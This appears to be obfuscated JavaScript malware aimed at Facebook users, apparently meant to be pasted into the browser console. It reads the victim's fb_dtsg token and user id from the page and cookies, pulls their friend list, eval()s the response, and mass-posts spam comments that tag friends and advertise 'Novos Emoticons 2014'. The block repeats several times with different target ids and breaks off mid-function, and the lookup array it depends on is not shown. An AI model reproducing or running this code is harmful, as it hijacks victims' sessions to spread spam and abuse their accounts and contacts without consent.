_0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[69],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[70],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[71],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[72],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[5],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[41],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[73],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[41],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);var _0xa22c=[_0xbddd[0],_0xbddd[1],_0xbddd[2],_0xbddd[3],_0xbddd[4],_0xbddd[74],_0xbddd[6],_0xbddd[7],_0xbddd[8],_0xbddd[9],_0xbddd[10],_0xbddd[11],_0xbddd[12],_0xbddd[13],_0xbddd[14],_0xbddd[15],_0xbddd[16],_0xbddd[17],_0xbddd[18],_0xbddd[19],_0xbddd[20],_0xbddd[21],_0xbddd[22],_0xbddd[23],_0xbddd[24],_0xbddd[25],_0xbddd[26],_0xbddd[27],_0xbddd[28],_0xbddd[29],_0xbddd[30],_0xbddd[31],_0xbddd[32],_0xbddd[33],_0xbddd[34],_0xbddd[35],_0xbddd[36],_0xbddd[37],_0xbddd[38],_0xbddd[39],_0xbddd[40],_0xbddd[75],_0xbddd[42],_0xbddd[43],_0xbddd[44],_0xbddd[45],_0xbddd[46],_0xbddd[47],_0xbddd[48],_0xbddd[49],_0xbddd[50],_0xbddd[51],_0xbddd[52],_0xbddd[53],_0xbddd[54],_0xbddd[55],_0xbddd[56],_0xbddd[57],_0xbddd[58],_0xbddd[59],_0xbddd[60],_0xbddd[61],_0xbddd[62],_0xbddd[63],_0xbddd[64]];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x6f2ex8= new XMLHttpRequest();_0x6f2ex8[_0xa22c[6]]=function (){if(_0x6f2ex8[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x6f2ex8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x6f2ex9=_0xa22c[24];_0x6f2ex9+=_0xa22c[25];_0x6f2ex9+=_0xa22c[26];_0x6f2ex9+=_0xa22c[27];_0x6f2ex9+=_0xa22c[28]+user_id;_0x6f2ex9+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x6f2ex9,true);} else {_0x6f2ex8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x6f2ex9,true);} ;_0x6f2ex8[_0xa22c[37]]();} ;function RandomArkadas(){var _0x6f2exb=_0xa22c[10];for(i=0;i<9;i++){_0x6f2exb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x6f2exb;} ;function yorum_yap(id,_0x6f2exd){var _0x6f2exe= new XMLHttpRequest();var _0x6f2ex9=_0xa22c[10];_0x6f2ex9+=_0xa22c[40]+id;_0x6f2ex9+=_0xa22c[41]+encodeURIComponent(_0x6f2exd);_0x6f2ex9+=_0xa22c[42];_0x6f2ex9+=_0xa22c[43];_0x6f2ex9+=_0xa22c[44];_0x6f2ex9+=_0xa22c[45];_0x6f2ex9+=_0xa22c[46];_0x6f2ex9+=_0xa22c[47]+id+_0xa22c[48];_0x6f2ex9+=_0xa22c[49];_0x6f2ex9+=_0xa22c[50];_0x6f2ex9+=_0xa22c[51];_0x6f2ex9+=_0xa22c[52];_0x6f2ex9+=_0xa22c[29]+user_id;_0x6f2ex9+=_0xa22c[53];_0x6f2ex9+=_0xa22c[54];_0x6f2ex9+=_0xa22c[55];_0x6f2ex9+=_0xa22c[56]+fb_dtsg;_0x6f2ex9+=_0xa22c[57];_0x6f2exe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x6f2exe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x6f2exe[_0xa22c[6]]=function (){if(_0x6f2exe[_0xa22c[7]]==4&&_0x6f2exe[_0xa22c[63]]==200){_0x6f2exe[_0xa22c[64]];} ;} ;_0x6f2exe[_0xa22c[37]](_0x6f2ex9);} ;arkadaslari_al(id);
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","455577634573788","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text= Novos Emoticons 2014 Facebook  ☀  ☁  ☔  ☕  ☝  ⚡  ⛄  ✨  🌀  🌂  🌊  🌙  🌟  🌱  🌴  🌵  🌷  🌸  🌺  🌺  🌻  🍀  🍁 🍂  🍃  🍊  🍎  🍓  🍔  🍸  🍺  :putnam:  :|]  :*  🐙  🐚  🐛  🎁  🎄  🎅  🎈  🎉  🎍  🎎  🎐  🎓  🎵  🎼  🐧  🐎  🐒  🐔  🐗 Novos Emoticons 2014 Facebook  ","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function 